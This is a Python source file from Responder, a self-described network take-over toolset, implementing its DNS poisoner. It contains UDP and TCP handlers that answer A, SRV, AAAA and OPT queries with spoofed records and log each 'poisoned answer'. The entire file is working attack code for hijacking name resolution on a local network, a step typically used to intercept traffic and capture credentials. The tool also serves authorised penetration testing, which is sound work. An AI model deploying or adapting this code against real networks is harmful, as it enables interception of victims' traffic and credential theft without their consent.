#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from utils import *
from packets import DNS_Ans, DNS_SRV_Ans, DNS6_Ans, DNS_AnsOPT
import datetime
if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

def ParseDNSType(data):
	QueryTypeClass = data[len(data)-4:]
	OPT = data[len(data)-22:len(data)-20]
	if OPT == "\x00\x29":
		return "OPTIPv4"
	# If Type A, Class IN, then answer.
	elif QueryTypeClass == "\x00\x01\x00\x01":
		return "A"
	elif QueryTypeClass == "\x00\x21\x00\x01":
		return "SRV"
	elif QueryTypeClass == "\x00\x1c\x00\x01":
		return "IPv6"



class DNS(BaseRequestHandler):
	def handle(self):
		# Ditch it if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None

		try:
			data, soc = self.request
			LineHeader = "[*] [DNS]"
			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "A":
				buff = DNS_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				
				print(color("%s %s A Record poisoned answer sent to: %-15s  Requested name: %s" % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv4":
				buff = DNS_AnsOPT()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				
				print(color("%s %s A OPT Record poisoned answer sent to: %-15s  Requested name: %s" % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))
				
			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "SRV":
				buff = DNS_SRV_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				
				print(color("%s %s SRV Record poisoned answer sent to: %-15s  Requested name: %s" % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "IPv6":
				buff = DNS6_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				
				print(color("%s %s AAAA Record poisoned answer sent to: %-15s  Requested name: %s" % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv6":
				buff = DNS6_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				
				print(color("%s %s AAAA OPT Record poisoned answer sent to: %-15s  Requested name: %s" % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))


		except Exception:
			pass

# DNS Server TCP Class
class DNSTCP(BaseRequestHandler):
	def handle(self):
		# Break out if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None
	
		try:
			data = self.request.recv(1024)
			LineHeader = "[*] [DNS]"
			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "A":
				buff = DNS_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				
				print(color("%s %s A Record poisoned answer sent to: %-15s  Requested name: %s" % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv4":
				buff = DNS_AnsOPT()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				
				print(color("%s %s A OPT Record poisoned answer sent to: %-15s  Requested name: %s" % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))
				
			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "SRV":
				buff = DNS_SRV_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				
				print(color("%s %s SRV Record poisoned answer sent: %-15s  Requested name: %s" % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "IPv6":
				buff = DNS6_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				
				print(color("%s %s AAAA Record poisoned answer sent: %-15s  Requested name: %s" % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv6":
				buff = DNS6_AnsOPT()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				
				print(color("%s %s AAAA OPT Record poisoned answer sent: %-15s  Requested name: %s" % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))

		except Exception:
			pass
